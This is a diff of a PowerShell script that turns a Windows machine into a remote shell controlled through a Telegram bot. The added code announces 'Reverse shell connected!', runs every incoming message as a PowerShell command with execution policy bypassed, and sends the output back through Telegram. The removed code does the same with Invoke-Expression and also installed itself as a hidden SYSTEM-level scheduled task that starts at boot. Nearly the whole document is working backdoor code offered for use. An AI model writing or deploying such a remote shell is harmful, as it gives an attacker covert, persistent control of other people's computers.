@@ -1,55 +1,48 @@
-# Load Bot Token and Chat ID from Environment Variables
-$botToken = [System.Environment]::GetEnvironmentVariable("TELEGRAM_BOT_TOKEN", "User")
-$chatId = [System.Environment]::GetEnvironmentVariable("TELEGRAM_CHAT_ID", "User")
-$apiUrl = "https://api.telegram.org/bot$botToken"
+$botToken = "YOUR_BOT_TOKEN"
+$chatID = "YOUR_CHAT_ID"
+$apiURL = "https://api.telegram.org/bot$botToken"
+$lastUpdateID = 0
 
-# Function to send messages to Telegram
-function Send-Message($message) {
-    Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body @{
-        chat_id = $chatId
-        text = $message
+function Send-TelegramMessage {
+    param ($message)
+    $message = [uri]::EscapeDataString($message)
+    $url = "$apiURL/sendMessage?chat_id=$chatID&text=$message"
+    try {
+        Invoke-RestMethod -Uri $url -Method Get | Out-Null
+    } catch {
+        Write-Host "Failed to send message: $_"
     }
 }
 
-# Function to get the latest command from Telegram
-function Get-Command() {
-    $updates = Invoke-RestMethod -Uri "$apiUrl/getUpdates"
-    if ($updates.result) {
-        return $updates.result[-1].message.text
+function Get-TelegramCommands {
+    param ($offset)
+    $url = "$apiURL/getUpdates?offset=$offset"
+    try {
+        $response = Invoke-RestMethod -Uri $url -Method Get
+        return $response.result
+    } catch {
+        return @()
     }
-    return $null
 }
 
-# Notify that the bot is active
-Send-Message "✅ PowerShell Bot Activated. Awaiting commands..."
+Send-TelegramMessage "Reverse shell connected!"
 
-# Loop to check for Telegram commands
 while ($true) {
-    $command = Get-Command
-    if ($command -eq "exit") {
-        Send-Message "🚫 PowerShell bot shutting down..."
-        break
+    $updates = Get-TelegramCommands -offset $lastUpdateID
+    foreach ($update in $updates) {
+        $lastUpdateID = $update.update_id + 1
+        if ($update.message.text) {
+            $command = $update.message.text
+            try {
+                $output = & powershell -NoProfile -ExecutionPolicy Bypass -Command $command 2>&1
+                if ($output -is [System.Array]) {
+                    $output = $output -join "`n"
+                }
+            } catch {
+                $output = $_.Exception.Message
+            }
+            Send-TelegramMessage $output
+        }
     }
-    elseif ($command) {
-        $output = Invoke-Expression $command 2>&1
-        Send-Message "```\n$output\n```"
-    }
-    Start-Sleep -Seconds 3  # Polling interval
+    Start-Sleep -Seconds 3
 }
-
-# Function to set up auto-start using Task Scheduler
-function Setup-Startup() {
-    $scriptPath = "$env:PUBLIC\telegram-shell.ps1"
-    Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
-
-    $taskName = "TelegramShell"
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File $scriptPath"
-    $trigger = New-ScheduledTaskTrigger -AtStartup
-    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-
-    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal
-    Send-Message "🚀 Bot is now set to run on startup!"
-}
-
-# Run startup setup (Only do this once, you can remove this line after first run)
-Setup-Startup
